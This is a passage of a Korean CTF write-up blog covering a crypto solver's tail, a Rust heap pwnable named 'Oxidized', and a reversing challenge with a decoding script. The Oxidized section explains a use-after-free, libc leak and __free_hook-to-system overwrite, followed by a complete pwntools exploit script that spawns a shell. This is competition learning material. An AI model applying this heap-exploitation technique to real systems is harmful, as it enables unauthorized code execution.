<span class="n">flag_set</span> <span class="o">=</span> <span class="p">[</span><span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">flag_len</span><span class="p">)]</span>
<span class="n">flag</span> <span class="o">=</span> <span class="p">[</span><span class="s">' '</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">flag_len</span><span class="p">)]</span>

<span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span> <span class="nb">sum</span><span class="p">([</span><span class="nb">len</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">flag_set</span><span class="p">])</span> <span class="o">&gt;</span> <span class="n">flag_len</span><span class="p">:</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span><span class="s">'3'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span><span class="s">'255'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">': '</span><span class="p">)</span>
    <span class="n">enc</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
    
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">flag_len</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">flag_set</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">count</span><span class="p">(</span><span class="n">enc</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
            <span class="n">flag_set</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">pop</span><span class="p">(</span><span class="n">flag_set</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">index</span><span class="p">(</span><span class="n">enc</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag_set</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
            <span class="n">flag</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">flag_set</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">^</span> <span class="n">my_key</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="s">' '</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">flag_set</span><span class="p">]))</span>
    <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>

<span class="k">print</span><span class="p">(</span><span class="n">count</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
</pre></table></code></div></div><h2 id="b-oxidized---pwnable">B. Oxidized - Pwnable<a href="#b-oxidized---pwnable" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Rust 포너블 문제이다.<br /> 정확하지 않은 정보이지만, 예전에 얼핏 듣기로는 러스트가 BOF 같은 low level 취약점으로부터 C언어보다 안전하도록 만들어졌다고 들어서 신기한 컨셉이라고 느껴졌다.</p><p>문제의 가장 큰 취약점은 UAF였다.</p><p>특정 크기의 tcache를 꽉 채우고 tcache에 들어가지 않는 큰 크기의 공간을 할당하여 UAF를 통해 libc의 주소를 얻었다.</p><p>또, free된node에 적당히 아다리를 맞추면서 update를 할 때<br /> 사이즈를 0으로 주게 되면 또 다른 free된 공간의 node에 write를 할 수 있는 버그가 존재하였다.</p><p>이를 이용해서 특정 노드를 아다리가 맞게 이름을 적당히 설정하고<br /> 해당 노드의 포인터를 <code class="language-plaintext highlighter-rouge">__free_hook</code>으로 변환한 뒤에 <code class="language-plaintext highlighter-rouge">is_string</code>을 false값으로 읽어지도록 노드를 수정하였다.</p><p>이때, 위 과정을 정확하게 수행하기 위해서 몇 시간의 동적디버깅 끝에 오프셋을 모두 뽑았다 ㅠ</p><p>또, update하는 과정에서 <code class="language-plaintext highlighter-rouge">__free_hook</code> 주소를 입력할 때 <code class="language-plaintext highlighter-rouge">read_str</code>를 호출하게 되는데<br /> 이때 해당 함수에서 UTF-8에 valid하지 않은 인풋이 들어오면 프로세스가 죽어버리는 현상이 있었다.<br /> 이 때문에 <code class="language-plaintext highlighter-rouge">__free_hook</code> 주소의 모든 바이트가 0x80보다 작은지 검사하고 아니면 다시 연결하는 조건을 추가했다.<br /> 단순 계산으로 약 1/16 정도의 확률이므로 조건을 맞추기는 어렵지 않았으나<br /> 리모트 환경에서 한 번 프로세스를 실행하면 다시 연결할 수 없어서 접속 한 번 할 때마다 vm을 다시 요청해야했다…</p><p>+ 대회가 끝난 후에 출제자 writeup을 봤을 땐 UTF-8 문제가 없어보여서 나중에 한 번 이유를 알아보기로 했다.</p><p>이후, 덮어 씌워진 노드를 update해서 <code class="language-plaintext highlighter-rouge">__free_hook</code>의 값을 <code class="language-plaintext highlighter-rouge">system</code> 주소로 수정했고<br /> <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code>을 하나 만들고 삭제해서 쉘을 휙득하였다.</p><p><br /> 아다리만 맞으면 그대로 돌리고 가져가서 코드가 좀 지저분하다</p><blockquote><p>Exploit Script</p></blockquote><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">http</span> <span class="kn">import</span> <span class="n">cookies</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="n">REMOTE</span><span class="o">=</span><span class="mi">1</span>
<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./chal_patched'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc-2.27.so'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">insert</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="n">value</span><span class="p">,</span><span class="n">size</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">LOGGING</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">size</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"insert(</span><span class="si">{</span><span class="n">key</span><span class="o">=</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="n">value</span><span class="o">=</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="n">size</span><span class="o">=</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"insert(</span><span class="si">{</span><span class="n">key</span><span class="o">=</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="n">value</span><span class="o">=</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'key &gt;&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">key</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">):</span>
        <span class="k">assert</span> <span class="n">size</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'is it String? (Y/N) &gt;&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'Y'</span><span class="p">)</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'size &gt;&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'is it String? (Y/N) &gt;&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'N'</span><span class="p">)</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">search</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">LOGGING</span><span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"search(</span><span class="si">{</span><span class="n">key</span><span class="o">=</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'key &gt;&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">key</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
    
<span class="k">def</span> <span class="nf">update</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">LOGGING</span><span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"update(</span><span class="si">{</span><span class="n">key</span><span class="o">=</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="n">value</span><span class="o">=</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="n">size</span><span class="o">=</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'3'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'key &gt;&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">key</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">):</span>
        <span class="k">assert</span> <span class="n">size</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'size &gt;&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">LOGGING</span><span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"delete(</span><span class="si">{</span><span class="n">key</span><span class="o">=</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'4'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'key &gt;&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">key</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">viewall</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">LOGGING</span><span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"viewall()"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'5'</span><span class="p">)</span>

<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">LOGGING</span><span class="o">=</span> <span class="bp">False</span>
        <span class="k">if</span> <span class="n">REMOTE</span><span class="p">:</span>
            <span class="n">pause</span><span class="p">()</span>
            <span class="n">x</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"https://dreamhack.io/api/v1/ctf/ctfs/24/challenges/177/vms/"</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="s">"""내 쿠키"""</span><span class="p">).</span><span class="n">json</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span> <span class="c1"># 빠르게 주소를 가져오기 위한 코드 ㅎㅎ;;
</span>
            <span class="n">host</span> <span class="o">=</span> <span class="n">x</span><span class="p">[</span><span class="s">'host'</span><span class="p">]</span>
            <span class="n">port</span> <span class="o">=</span> <span class="n">x</span><span class="p">[</span><span class="s">'port_mappings'</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span>

            <span class="k">print</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
            <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
            <span class="n">LOGGING</span> <span class="o">=</span> <span class="bp">True</span>

        <span class="c1"># if REMOTE:p = remote('192.168.2.1',13100)
</span>        <span class="k">else</span><span class="p">:</span><span class="n">p</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="n">aslr</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
            <span class="n">insert</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">).</span><span class="n">encode</span><span class="p">(),</span><span class="mh">0x60</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
            <span class="n">delete</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">)</span>

        <span class="n">insert</span><span class="p">(</span><span class="mh">0x70</span><span class="p">,</span> <span class="sa">b</span><span class="s">'DEADBEEF'</span><span class="p">,</span><span class="mh">0x420</span><span class="p">)</span>
        <span class="n">insert</span><span class="p">(</span><span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0xcafebabe</span><span class="p">)</span>

        <span class="n">viewall</span><span class="p">()</span>
        <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'1. Insert item'</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">).</span><span class="n">splitlines</span><span class="p">()[</span><span class="mi">6</span><span class="p">].</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">])</span> <span class="o">-</span> <span class="mh">0x3ebcb0</span>
        <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s">'LIBC: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

        <span class="n">viewall</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">REMOTE</span><span class="p">:</span><span class="n">heap</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'1. Insert item'</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">).</span><span class="n">splitlines</span><span class="p">()[</span><span class="mi">2</span><span class="p">].</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">])</span> <span class="o">-</span> <span class="mi">21088</span>
        <span class="k">else</span><span class="p">:</span><span class="n">heap</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'1. Insert item'</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">).</span><span class="n">splitlines</span><span class="p">()[</span><span class="mi">2</span><span class="p">].</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">])</span> <span class="o">-</span> <span class="mi">21344</span>
        <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s">'HEAP: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

        <span class="n">target</span> <span class="o">=</span> <span class="mh">0x5468</span> <span class="o">+</span> <span class="n">heap</span>
        <span class="k">if</span> <span class="n">REMOTE</span><span class="p">:</span><span class="n">target</span><span class="o">-=</span><span class="mh">0x100</span>
        <span class="k">print</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>

        <span class="n">viewall</span><span class="p">()</span>
        <span class="n">victim</span> <span class="o">=</span> <span class="mh">0x70</span>
        <span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">victim</span><span class="p">))</span>

        <span class="k">print</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>

        <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">i</span><span class="o">&gt;=</span><span class="mh">0x80</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">p64</span><span class="p">(</span><span class="n">target</span><span class="p">)):</span>
            <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span><span class="sa">b</span><span class="s">'6'</span><span class="p">)</span>
            <span class="k">assert</span> <span class="mi">0</span>
            
        <span class="n">pause</span><span class="p">()</span>
        <span class="n">LOGGING</span> <span class="o">=</span> <span class="bp">True</span>
        <span class="n">update</span><span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x60</span><span class="s">'</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">target</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span>

        <span class="n">writer</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="sa">b</span><span class="s">'60'</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>
        <span class="n">update</span><span class="p">(</span><span class="n">writer</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">])</span>
        <span class="n">update</span><span class="p">(</span><span class="mh">0xD0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">])</span>
        <span class="n">insert</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="sa">b</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">,</span><span class="mh">0x10</span><span class="p">)</span>
        <span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

        <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
    <span class="k">except</span> <span class="nb">EOFError</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">continue</span>
    <span class="k">except</span> <span class="nb">AssertionError</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">continue</span>
</pre></table></code></div></div><h2 id="c-run---reversing">C. RUN - Reversing<a href="#c-run---reversing" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>바이너리를 분석해보면 아주 깔끔하게 인코딩 루틴만 존재한다.</p><p>인코딩 루틴은 크게 복잡하지 않았고 아래와 같았다.</p><ol><li>인풋 파일의 모든 비트를 <code class="language-plaintext highlighter-rouge">char[]</code>에 저장한다.<li>해당 배열을 처음부터 돌면서 0이 나오면 반복되는 0의 수를 센다.<li>반복되는 0의 수의 값을 c라고 했을 때, c의 비트 수 만큼 1을 output 버퍼에 추가한다.<li>c를 <code class="language-plaintext highlighter-rouge">little-endian</code>으로 output 버퍼에 추가한다.<li>만약 1이 나오면 output 버퍼에 <code class="language-plaintext highlighter-rouge">00</code>을 추가한다.<li>배열이 끝난 후엔, output 버퍼의 값을 온전한 바이트로 전환하기 위해 1로 패딩을 해준다.<li><code class="language-plaintext highlighter-rouge">{input file name}.enc</code> 파일에 버퍼를 출력한다.</ol><p>이처럼 단순한 비트 압축 방식으로 인코딩이 되어있으므로 간단한 파이썬 스크립트를 작성하여 풀이하였다.<br /> 그런데 아주 사소한 실수를 발견하지 못해서 푸는 데에 생각보다 시간을 좀 많이 썼었다.</p><blockquote><p>Solution Script</p></blockquote><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"flag.enc"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
    <span class="n">t</span><span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>

<span class="n">b</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">bin</span><span class="p">(</span><span class="n">i</span><span class="p">)[</span><span class="mi">2</span><span class="p">:].</span><span class="n">zfill</span><span class="p">(</span><span class="mi">8</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="ow">or</span> <span class="s">"little-endian -&gt; big-endian"</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">t</span><span class="p">)</span>

<span class="n">g</span> <span class="o">=</span> <span class="s">''</span>
<span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">c</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
    <span class="n">c</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">while</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="n">c</span><span class="p">]</span> <span class="o">==</span> <span class="s">'1'</span><span class="p">:</span><span class="n">c</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">except</span><span class="p">:</span><span class="k">break</span>

    <span class="k">assert</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="n">c</span><span class="p">]</span> <span class="o">==</span> <span class="s">'0'</span><span class="p">)</span>

    <span class="n">c</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="n">r</span> <span class="o">=</span> <span class="s">''</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="n">c</span> <span class="o">+</span> <span class="n">j</span><span class="p">]</span> <span class="o">+</span> <span class="n">r</span>

    <span class="k">assert</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="n">c</span><span class="o">+</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="s">'1'</span> <span class="ow">or</span> <span class="n">c</span> <span class="o">==</span> <span class="mi">1</span><span class="p">),(</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="n">c</span><span class="o">+</span><span class="n">j</span><span class="p">],</span> <span class="n">c</span><span class="p">,</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="n">c</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">c</span><span class="o">+</span><span class="n">c</span><span class="p">],</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">c</span><span class="p">],</span> <span class="n">g</span><span class="p">)</span>

    <span class="n">g</span> <span class="o">+=</span> <span class="s">'0'</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="s">'1'</span>
    <span class="n">i</span> <span class="o">+=</span> <span class="n">c</span> <span class="o">*</span> <span class="mi">2</span>

<span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">g</span><span class="p">)</span><span class="o">&amp;</span><span class="mi">7</span><span class="p">)</span>
